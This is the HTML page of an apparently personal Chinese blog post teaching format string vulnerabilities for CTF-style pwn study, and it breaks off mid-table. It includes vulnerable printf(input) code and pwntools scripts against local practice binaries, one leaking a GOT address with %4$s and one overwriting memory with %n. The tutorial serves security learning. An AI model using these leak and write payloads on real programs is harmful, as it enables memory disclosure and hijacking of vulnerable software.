+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 1.05rem;">BUU<sup>4</sup></a><a href="/tags/NSS/" style="font-size: 1.05rem;">NSS<sup>3</sup></a><a href="/tags/PWN/" style="font-size: 1.05rem;">PWN<sup>4</sup></a><a href="/tags/RC4/" style="font-size: 1.05rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 1.05rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 1.05rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 1.05rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 1.05rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 1.05rem;">WP<sup>2</sup></a><a href="/tags/printf/" style="font-size: 1.05rem;">printf<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 1.05rem;">pwn_study<sup>3</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 1.05rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 1.05rem;">动调<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 1.05rem;">栈溢出<sup>1</sup></a><a href="/tags/%E7%8C%9C%E6%95%B0/" style="font-size: 1.05rem;">猜数<sup>1</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 1.05rem;">花指令<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">July 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">March 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/pwn-study/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>pwn_study</span></a></span></div></div><h1 class="post-title" itemprop="name headline">格式化字符串</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-07-21T01:05:48.000Z" title="Created 2025-07-21 09:05:48">2025-07-21</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-07-21T13:35:26.315Z" title="Updated 2025-07-21 21:35:26">2025-07-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"><header><a href="/tags/pwn-study/" tabindex="-1" itemprop="url">pwn_study</a><h1 id="CrawlerTitle" itemprop="name headline">格式化字符串</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">John Doe</span><time itemprop="dateCreated datePublished" datetime="2025-07-21T01:05:48.000Z" title="Created 2025-07-21 09:05:48">2025-07-21</time><time itemprop="dateCreated datePublished" datetime="2025-07-21T13:35:26.315Z" title="Updated 2025-07-21 21:35:26">2025-07-21</time></header><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据它解析之后的参数。</p>
+<p>通俗来说，格式化字符串函数的作用是将计算机内存中的数据转化为人类可读的字符串格式。</p>
+<p>一般来说，格式化字符串在利用的时候主要分为三个部分：</p>
+<p>(1）格式化字符串函数。</p>
+<p>(2）格式化字符串。</p>
+<p>(3）后续参数，可选。</p>
+<p>用<code>printf(&quot;name:%s,age:%d,salary:%4.2f&quot;,myname,myage, mysalary）</code></p>
+<p>printf函数叫作格式化字符串函数，”name:%s,age:%d,salary:%4.2f”叫作格式化字符串，“myname,myage,mysalary”叫作后续参数。</p>
+<h3 id="🧱-常见的格式化字符串符号"><a href="#🧱-常见的格式化字符串符号" class="headerlink" title="🧱 常见的格式化字符串符号"></a>🧱 常见的格式化字符串符号</h3><table>
+<thead>
+<tr>
+<th>格式符</th>
+<th>作用</th>
+<th>示例</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>%x</code>&#x2F;<code>%p</code></td>
+<td>以十六进制形式输出栈上的值</td>
+<td><code>%x</code>→<code>0xdeadbeef</code></td>
+<td><code>%p</code>通常带<code>0x</code>前缀</td>
+</tr>
+<tr>
+<td><code>%d</code>&#x2F;<code>%u</code></td>
+<td>以十进制输出栈上的值</td>
+<td><code>%d</code>→<code>3735928559</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%c</code></td>
+<td>输出栈上值的最低一个字节</td>
+<td><code>%c</code>→<code>&#39;A&#39;</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%s</code></td>
+<td>把栈上的值当作地址，输出该地址的字符串</td>
+<td><code>%s</code>→<code>&quot;Hello&quot;</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%hn</code></td>
+<td>写入 2 字节（short）</td>
+<td><code>%hn</code>→ 写入低 2 字节</td>
+<td></td>
+</tr>
+<tr>
+<td><code>%hhn</code></td>
+<td>写入 1 字节（char）</td>
+<td><code>%hhn</code>→ 写入低 1 字节</td>
+<td></td>
+</tr>
+<tr>
+<td><code>%n</code></td>
+<td>将已输出字符数写入栈上的地址</td>
+<td><code>%n</code>→ 写入<code>0x4</code>到指定地址</td>
+<td></td>
+</tr>
+<tr>
+<td><code>%$p</code>&#x2F;<code>%%$s</code></td>
+<td>指定第几个参数位置的值</td>
+<td><code>%4$p</code>→ 第 4 个参数</td>
+<td></td>
+</tr>
+<tr>
+<td><code>%%</code></td>
+<td>输出一个<code>%</code>字符本身</td>
+<td><code>%%</code>→<code>%</code></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721092127879.png" alt="image-20250721092127879"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721092639513.png" alt="image-20250721092639513"></p>
+<p>当用户控制了 <code>printf()</code> 的第一个参数（即格式化字符串），而程序没有进行过滤或限制，就可能造成以下问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char input[100];</span><br><span class="line">fgets(input, sizeof(input), stdin);</span><br><span class="line">printf(input);  // ⚠️ 危险！用户输入直接作为格式化字符串</span><br></pre></td></tr></table></figure>
+
+<p>此时，攻击者可以构造输入，如：</p>
+<p>%x %x %x %x %s</p>
+<p>程序会尝试从栈中读取参数，但由于没有提供参数列表，<code>printf()</code> 会继续从栈中“猜测”数据。这可能导致：</p>
+<ul>
+<li><p>泄露栈内存内容（如返回地址、canary、函数指针等）</p>
+</li>
+<li><p>写入内存（通过 <code>%n</code> 格式符）</p>
+</li>
+</ul>
+<p>虽然没有写任何参数，但还是会对应地解析参数，因为在格式化字符串中写了对应的解析方式，所以在后续的函数运行中会解析栈上的元</p>
+<p>素。对于整型值和浮点值，这没有什么问题，不管栈上是什么数据都能够按照整型值和浮点值解析出来，而字符串形式就不一定能解析出来</p>
+<p>了。如果是一个非法地址，比如NULL，那么在解析的时候就会报错，</p>
+<p>因为这个地址按照字符串解析是无法解析出来的，程序就会崩溃。这就是格式化字符串漏洞的基本原理</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="leakmemory-泄露栈上内容"><a href="#leakmemory-泄露栈上内容" class="headerlink" title="leakmemory(泄露栈上内容)"></a>leakmemory(泄露栈上内容)</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721102525461.png" alt="image-20250721102525461"></p>
+<p>用了 <code>%100s</code> 来防止缓冲区溢出，但<strong>并没有限制用户输入的格式符内容</strong> 。也就是说：</p>
+<ul>
+<li><p>用户可以输入 <code>%x</code>、<code>%s</code>、<code>%n</code> 等格式符。</p>
+</li>
+<li><p><code>printf</code> 会根据这些格式符从栈中“猜测”数据，从而造成信息泄露或任意地址写入。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721102907893.png" alt="image-20250721102907893"></p>
+</li>
+</ul>
+<h3 id="leakmemory-泄露任意地址内存"><a href="#leakmemory-泄露任意地址内存" class="headerlink" title="leakmemory(泄露任意地址内存)"></a>leakmemory(泄露任意地址内存)</h3><p>这里的目标设立泄露isoc99_scanf函数（scanf编译之后是isoc99_scanf在内存中的地址）。</p>
+<p><code>%k$s</code></p>
+<p>这里的p是可以更换的，比如更换为s就可以解析栈上的数据为字符串。</p>
+<p>k：表示要打印的参数距离目前格式化字符串参数的距离。</p>
+<p>因为在没有给printf提供对应的字符，但它是一个<strong>可变参数函数</strong> ，它会从栈上依次读取数据来填充格式化字符串中的 <code>%p</code>、<code>%x</code>、<code>%s</code>、<code>%n</code> 等指令。</p>
+<p>但你并不知道你输入的字符串在栈上的具体位置，所以你需要：</p>
+<blockquote>
+<p><strong>找到你的输入字符串在栈上的偏移量，才能精准控制读写的内容。</strong> </p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721145854783.png" alt="image-20250721145854783"></p>
+<p>所以偏移量就是4</p>
+<p>所以构造payload &#x3D; p32(scanf_got) + “%4$s”</p>
+<p>相当于print(p32(scanf_got) + “%4$s”)</p>
+<p>所以前四个字节是输出的scanf的got表</p>
+<blockquote>
+<p> 🧠 关键区别：<strong>地址 vs 地址的内容</strong></p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>scanf_got</code></td>
+<td>GOT 表中<code>scanf</code>的地址（<code>.got</code>段中的一个位置）</td>
+<td><code>0x804a008</code></td>
+<td>就像书的目录页码</td>
+</tr>
+<tr>
+<td>泄露的地址（<code>leak_addr</code>）</td>
+<td>这个 GOT 表项中存储的值（即<code>scanf</code>的实际地址）</td>
+<td><code>0xf7e01234</code></td>
+<td>就像目录页码指向的那一页的内容</td>
+</tr>
+</tbody></table>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./leakmemory&quot;)</span><br><span class="line">elf = ELF(&quot;./leakmemory&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b printf&quot;)</span><br><span class="line"></span><br><span class="line">scanf_got = elf.got[&quot;__isoc99_scanf&quot;]</span><br><span class="line">payload=p32(scanf_got)+b&quot;%4$s&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak_addr = u32(p.recv(8)[4:])</span><br><span class="line">scanf_addr = leak_addr</span><br><span class="line">log.success(&quot;scanf_addr:&quot; + hex(scanf_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>printf</code> 执行流程：</p>
+<ol>
+<li><code>printf</code> 会从栈上读取参数；</li>
+<li>它看到 <code>%4$s</code>，会从第 4 个参数位置读取一个地址；</li>
+<li>这个地址是 <code>0x804a018</code>（你写入的 GOT 地址）；</li>
+<li>然后从 <code>0x804a018</code> 地址中读出一个指针（比如 <code>0xf7e01234</code>，即 <code>scanf</code> 的运行时地址）；</li>
+<li><code>%s</code> 会从 <code>0xf7e01234</code> 开始读取字符串，直到遇到 <code>\0</code>；</li>
+<li>最终你接收到的数据中包含 <code>0xf7e01234</code>。</li>
+</ol>
+<p>📌 总结</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>elf.got[&quot;scanf&quot;]</code>和<code>elf.got[&quot;__isoc99_scanf&quot;]</code>一样吗？</td>
+<td>不一定，取决于编译器</td>
+</tr>
+<tr>
+<td>为什么会有<code>__isoc99_scanf</code>？</td>
+<td>GCC 编译器为了支持 C99 标准引入的</td>
+</tr>
+<tr>
+<td>怎么确认用哪个？</td>
+<td>用<code>readelf -r</code>或<code>objdump -TR</code>查看 GOT 表</td>
+</tr>
+<tr>
+<td>能不能替换？</td>
+<td>只有 GOT 表中存在对应符号时才能替换</td>
+</tr>
+<tr>
+<td>如果写错了会怎样？</td>
+<td>报错：<code>KeyError</code></td>
+</tr>
+</tbody></table>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721150514526.png" alt="image-20250721150514526"></p>
+<h4 id="函数调用完整过程"><a href="#函数调用完整过程" class="headerlink" title="函数调用完整过程"></a>函数调用完整过程</h4><p>🌟 阶段 0️⃣：在 <code>vulnfunc</code> 里（调用 printf 之前）</p>
+<p>这是已经在 <code>vulnfunc</code> 里，且栈帧已经建立好了。<br> 栈顶在 esp，栈低在高地址方向。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">     ↑ 高地址</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 参数n（可能是命令行参数）       |</span><br><span class="line">| 参数2                        |</span><br><span class="line">| 参数1                        |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 返回地址 → main              |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 上一个 ebp                   | ← ebp (vulnfunc 的 ebp)</span><br><span class="line">──────────────────────────────</span><br><span class="line">| vulnfunc 局部变量            |</span><br><span class="line">| …                            | ← esp （在 vulnfunc 里）</span><br><span class="line">      ↓ 低地址</span><br></pre></td></tr></table></figure>
+
+<p>当你刚进入 <code>vulnfunc</code>：</p>
+<ul>
+<li><p><code>ebp</code> → 上一个 ebp</p>
+</li>
+<li><p><code>ebp+4</code> → 返回地址（返回到 main）</p>
+</li>
+<li><p><code>ebp-xx</code> → vulnfunc 的局部变量</p>
+</li>
+<li><p><code>esp</code> → 最低处，指向局部变量</p>
+</li>
+</ul>
+<p>🌟 阶段 1️⃣：调用 <code>printf(format)</code></p>
+<p>当 vulnfunc 调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">printf(format);</span><br></pre></td></tr></table></figure>
+
+<p>调用者把返回地址 &amp; 参数压入栈：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">     ↑ 高地址</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 参数n（main 的参数）           |</span><br><span class="line">| …                            |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 返回地址 → main              |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 上一个 ebp                   | ← ebp (vulnfunc)</span><br><span class="line">──────────────────────────────</span><br><span class="line">| vulnfunc 局部变量            |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 参数1=format                 | ← esp+4</span><br><span class="line">| 返回地址 → vulnfunc+下一条   | ← esp</span><br><span class="line">      ↓</span><br></pre></td></tr></table></figure>
+
+<p>此时 esp 指向 <strong>printf 的返回地址</strong>，再往上是 printf 的参数。</p>
+<p>🌟 阶段 2️⃣：进入 <code>printf</code> 后</p>
+<p>在 printf 开始执行后，它建立自己的栈帧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">      ↑ 高地址</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 参数n（main 的参数）           |</span><br><span class="line">| …                            |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 返回地址 → main              |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 上一个 ebp                   | ← ebp (vulnfunc)</span><br><span class="line">──────────────────────────────</span><br><span class="line">| vulnfunc 局部变量            |</span><br><span class="line">──────────────────────────────</span><br><span class="line">| 参数1=format                 | ← ebp+8</span><br><span class="line">| 返回地址 → vulnfunc+下一条   | ← ebp+4</span><br><span class="line">| 上一个 ebp                   | ← ebp (printf)</span><br><span class="line">──────────────────────────────</span><br><span class="line">| printf 局部变量              | ← esp</span><br><span class="line">      ↓</span><br></pre></td></tr></table></figure>
+
+<p>这里：</p>
+<ul>
+<li><code>printf</code> 把当前的 ebp 压栈</li>
+<li>把 ebp 设置为 esp</li>
+<li>esp 再向下留出局部变量空间</li>
+</ul>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721144623118.png" alt="image-20250721144623118"></p>
+<p>scanf函数会把读取到的数放在栈上一个空间，然后%p会把它泄露出来</p>
+<ol>
+<li>使用 <code>scanf</code> 读取一个字符串（最多 100 字节），存入 <code>format</code> 缓冲区；</li>
+<li>然后直接将这个字符串作为参数传给 <code>printf</code>，即：<code>printf(format);</code></li>
+</ol>
+<h3 id="overwrite-覆盖任意地址内存"><a href="#overwrite-覆盖任意地址内存" class="headerlink" title="overwrite(覆盖任意地址内存)"></a>overwrite(覆盖任意地址内存)</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721153203305.png" alt="image-20250721153203305"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721153247877.png" alt="image-20250721153247877"></p>
+<p>所以这道题的重点是修改几个数的值</p>
+<p>1）将a覆盖为0x10。</p>
+<p>2）将b覆盖为2。</p>
+<p>3）将c覆盖为0x12345678。</p>
+<p>其中a是局部变量，b,c是全局变量</p>
+<p>局部变量存储在栈上，全局变量存储在数据段中（分为已初始化rodata和未初始化bss两部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+ &lt;--- 高内存地址</span><br><span class="line">| 命令行参数 &amp; 环境变量 |</span><br><span class="line">+---------------------+</span><br><span class="line">|       栈 (Stack)    |  &lt;-- 局部变量、函数参数、返回地址</span><br><span class="line">|                     |</span><br><span class="line">|   Function Call N   |</span><br><span class="line">|   (局部变量, 返回地址等)|</span><br><span class="line">|   Function Call 2   |</span><br><span class="line">|   (局部变量, 返回地址等)|</span><br><span class="line">|   Function Call 1   |</span><br><span class="line">|   (局部变量, 返回地址等)|</span><br><span class="line">|        ...          |</span><br><span class="line">|                     |</span><br><span class="line">|        空闲         |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|       堆 (Heap)     |  &lt;-- 动态分配内存 (malloc/new)</span><br><span class="line">|                     |</span><br><span class="line">|        ...          |</span><br><span class="line">+---------------------+</span><br><span class="line">|   .bss 段 (未初始化数据) |  &lt;-- 未初始化的全局变量和静态变量 (例如: b)</span><br><span class="line">+---------------------+</span><br><span class="line">|   .data 段 (已初始化数据) |  &lt;-- 已初始化的全局变量和静态变量 (例如: c)</span><br><span class="line">+---------------------+</span><br><span class="line">|     .text 段 (代码)   |  &lt;-- 程序执行代码 (指令)</span><br><span class="line">+---------------------+</span><br><span class="line">|       保留区域      |</span><br><span class="line">+---------------------+ &lt;--- 低内存地址</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="a的处理（局部变量）"><a href="#a的处理（局部变量）" class="headerlink" title="a的处理（局部变量）"></a>a的处理（局部变量）</h4><p>首先，a是局部变量，局部变量是存储在栈上的，其地址会因为开启ASLR而变化，所以在函数中将a的地址打印出来了</p>
+<p><strong>脚本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./overwrite&quot;)</span><br><span class="line">a=int(p.recvuntil(&#x27;\n&#x27;,drop=True),16)</span><br><span class="line">print(hex(a))</span><br><span class="line">payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">m=p.recv()</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+
+<p>int和u32()</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>int(..., 16)</code></td>
+<td>接收到的是字符串形式的地址（如<code>&quot;0xffa79dbc&quot;</code>）</td>
